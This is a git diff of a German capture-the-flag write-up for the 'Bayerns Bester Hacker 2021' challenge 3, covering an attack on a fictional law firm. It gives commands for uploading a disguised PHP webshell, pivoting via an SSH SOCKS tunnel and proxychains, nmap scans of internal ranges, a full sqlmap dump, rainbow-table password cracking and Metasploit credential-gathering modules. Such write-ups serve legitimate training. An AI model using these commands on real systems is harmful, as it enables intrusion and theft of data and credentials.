@@ -22,6 +22,7 @@ Dein Challenge-Team von Bayerns Bester Hacker!
 
 ## Lösung
 
+
 ### Vorbereitung
 
 Das Briefing deutet auf Hinweise aus den ersten zwei Challenges hin:
@@ -83,21 +84,36 @@ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
 
 
 #### File Share
+
+Die angegebene Adresse führt zu einem Webinterface, welches einen sicheren Dateitransfer zur Kanzlei verspricht. Die Ansicht stellt ein Datei-Upload-Formular bereit.
 ![Bayerns Bester Hacker 2021 Challenge 3 - File Share 1](Screenshots/BBH2021C3_File-Share-1.png)
+
+Ein Test ergibt, dass die hochgeladenen Dateien zu einem Fehler führen:
 ![Bayerns Bester Hacker 2021 Challenge 3 - File Share 2](Screenshots/BBH2021C3_File-Share-2.png)
+
+Fehler nach Upload:
 ![Bayerns Bester Hacker 2021 Challenge 3 - File Share 3](Screenshots/BBH2021C3_File-Share-3.png)
+
+Parkplatz: Transfer-Headers
 ![Bayerns Bester Hacker 2021 Challenge 3 - File Share 4](Screenshots/BBH2021C3_File-Share-4.png)
 
+Das eingesetzte Tool [go simple upload server](https://github.com/mayth/go-simple-upload-server) hat kaum bekannte Schwachstellen, auch wenn die empfohlene Sicherheitskonfiguration mit Tokens nicht implementiert ist.
 
-https://github.com/mayth/go-simple-upload-server
+Parkplatz: Upload einer getarnten Webshell für eine spätere Ausnutzung:
+```
 curl -Ffile=@shell.php.pdf https://fileshare.rae-schmitt.ddnss.de/upload
+```
 
+Später in diesem Bericht finden wir, dass der eingeschränkte Host keine Verbindung zur Außenwelt herstellen darf. Die Möglichkeit hier eine Shell zu platzieren, die intern auf den Host oder für die Verwendung bereit steht, war geplant, war dann aber nicht notwendig.
+
+```
 curl -F "file=@payload.sh.pdf" -F "to=" -F "id=fmgmt@tutanota.com" https://fileshare.rae-schmitt.ddnss.de/upload
   Your files have been uploaded successfully. <br />
   It's been saved as: <code>oktzuobbpk.zip</code><br />
   The Password is: <code>YtnTHeJdirEdHn</code> <br /><br />
   Pleas send the Password to <code></code> via a secure
 curl -v -X POST -F "email=fmgmt@tutanota.com" -F "password=pmbBEeHpdCEUbr" http://192.168.2.137:8080/files/auswdtpxyp.zip
+```
 
 
 #### SSH-Host
@@ -214,30 +230,80 @@ Port 8080:       Open
 Das durchschleusen der Anfragen und ein Upgrade der Session in Metasploit gestaltet sich schwierig:
 ![Bayerns Bester Hacker 2021 Challenge 3 - Restricted Shell Pivot](Screenshots/BBH2021C3_Shell-Upgrade.png)
 
-BBH2021C3_sqlmap
-BBH2021C3_sqlmap-success
+Damit wir den SSH-Host trotzdem als Pivot Einstieg in das interne Netzwerk nutzen können, wird proxychains verwenden.
+
+Dazu wird ein SSH-Tunnel vom lokalen Host mit den oben genannten Credentials aufgebaut:
+```
+ssh -D localhost:9049 -f -N -i ../Challenge1/ssh.key kayilvggxt@fileshare.rae-schmitt.ddnss.de
+```
+
+Die proxychains.conf erhält dann:
+```
+socks5  127.0.0.1 9049
+```
+
+Damit können die internen IPs gescannt werden - ohne, dass eine Anwendung selbst auf den eingeschränkten Host deployt werden muss:
+
+```
+proxychains nmap -sV -v -P0 -oG 192.168.2.137.log 192.168.2.137
+proxychains nmap -sV -v -P0 -oG 192.168.2.0.log 192.168.2.0/24
+proxychains nmap -sV -v -P0 -oG 172.18.0.0.log 172.18.0.0/16
+proxychains nmap -sV -v -P0 -oG 172.17.0.0.log 172.17.0.0/16
+```
+
+
+##### SQL Injection
+
+Der Scan zeigt, dass die interne IP **192.168.2.137** ähnlich dem *File Share* einen Dateidownload ermöglicht. Dazu wird eine Email-Adresse und Passwort abgefragt.
+Dieses Formular wird über den Pivot-Host auf bekannte SQL-Injection-Schwachstellen getestet:
+
+```
+proxychains python3 ~/tools/sqlmap-dev/sqlmap.py -a -o -v --mobile --random-agent --level=5 --risk=3 --batch --forms --dump-all -u "http://192.168.2.137:8080/
+```
+
+... und ergibt instant einen Erfolg:
+![Bayerns Bester Hacker 2021 Challenge 3 - SQL Injection sqlmap](Screenshots/BBH2021C3_sqlmap.png)
+
+Es können uneingeschränkt alle Tabellen, Spalten, Daten und Nutzerkonten abgerufen werden:
+![Bayerns Bester Hacker 2021 Challenge 3 - SQL Injection sqlmap](Screenshots/BBH2021C3_sqlmap-success.png)
+
+Ein Auszug der Kundentabelle:
+![Bayerns Bester Hacker 2021 Challenge 3 - SQL Injection sqlmap](Screenshots/BBH2021C3_sqlmap-clients.png)
+
+Für die Challenge ist der älteste Fall gefragt:
+Database: public Table: cases
+| id | title    | lawyer | company | created    | description                                                                                                                                                                                                                                                                                                                                                                                                                               |
+|----|----------|--------|---------|------------|-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------|
+| 1  | Home Ing | 1      | 500     | 2018-02-04 | In eleifend quam a odio.                                                                                                                                                                                                                                                                                                                                                                                                                  |
+| 2  | Sonsing  | 3      | 353     | 2016-05-15 | Sed ante. Vivamus tortor. Duis mattis egestas metus. Aenean fermentum. Donec ut mauris eget massa tempor convallis. Nulla neque libero, convallis eget, eleifend luctus, ultricies eu, nibh. Quisque id justo sit amet sapien dignissim vestibulum. Vestibulum ante ipsum primis in faucibus orci luctus et ultrices posuere cubilia Curae; Nulla dapibus dolor vel est. Donec odio justo, sollicitudin ut, suscipit a, feugiat et, eros. |
+| 3  | Wrapsafe | 3      | 473     | 2015-05-05 | In blandit ultrices enim. Lorem ipsum dolor sit amet, consectetuer adipiscing elit. Proin interdum mauris non ligula pellentesque ultrices. Phasellus id sapien in sapien iaculis congue. Vivamus metus arcu, adipiscing molestie, hendrerit at, vulputate vitae, nisl. Aenean lectus. Pellentesque eget nunc. Donec quis orci eget orci vehicula condimentum.                                                                            |
+| 4  | Greenlam | 2      | 611     | 2017-08-21 | Maecenas tincidunt lacus at velit. Vivamus vel nulla eget eros elementum pellentesque. Quisque porta volutpat erat. Quisque erat eros, viverra eget, congue eget, semper rutrum, nulla. Nunc purus. Phasellus in felis. Donec semper sapien a libero.                                                                                                                                                                                     |
+| 5  | Bigtax   | 1      | 332     | 2021-03-12 | Cum sociis natoque penatibus et magnis dis parturient montes, nascetur ridiculus mus.
+
 
 ##### Passwoerter
 
-https://crackstation.net/ss
-BBH2021C3_Passwoerter-cracked
+In der Aufgabe wurde auch nach dem Passwort des **Administrators A. Müller** gefragt. Dazu wird der Output des PostgreSQL-Servers genommen.
+Die Passwörter werden dort als ```sha256``` gehashter Salt gespeichert. Der Online-Dienst [Crackstation](https://crackstation.net/) bietet Rainbow-Tabellen an, die den Inhalt problemlos wiederherstellen:
+![Bayerns Bester Hacker 2021 Challenge 3 - Passwörter](Screenshots/BBH2021C3_Passwoerter-cracked.png)
 
 
 # Fazit
 
+Zugriff auf die Daten im SQL-Server wurde durch den Pivot über den ersten SSH-Host gelöst.
+Den Test des weiteren Netzwerks und öffentlichen Teil des Webinterfaces war hilfreich, um zum richtigen Zielsystem zu kommen.
+
 
 # Parkplatz
 
-tcpdump
-cftp3
-fakeroot-tcp
+Installierte Software zum Testen:
+* tcpdump
+* cftp3
+* fakeroot-tcp
 
-Webshell:
-https://www.whitewinterwolf.com/posts/2017/12/02/wwwolfs-php-webshell-users-guide/
-
-
-
-msf6 post(linux/gather/enum_network) > exploit
+```
+msf6
+post(linux/gather/enum_network) > exploit
 [+] Info:
 [+]     Ubuntu 18.04.5 LTS
 [+]     Linux ubuntu_srv 4.15.0-153-generic #160-Ubuntu SMP Thu Jul 29 06:54:29 UTC 2021 x86_64 x86_64 x86_64 GNU/Linux
@@ -247,3 +313,4 @@ msf6 post(linux/gather/enum_network) > exploit
 [+] If-Up/If-Down stored in /home/pw/.msf4/loot/20210822133453_default_46.251.251.66_linux.enum.netwo_077262.txt
 
 post(multi/gather/gpg_creds)
+```
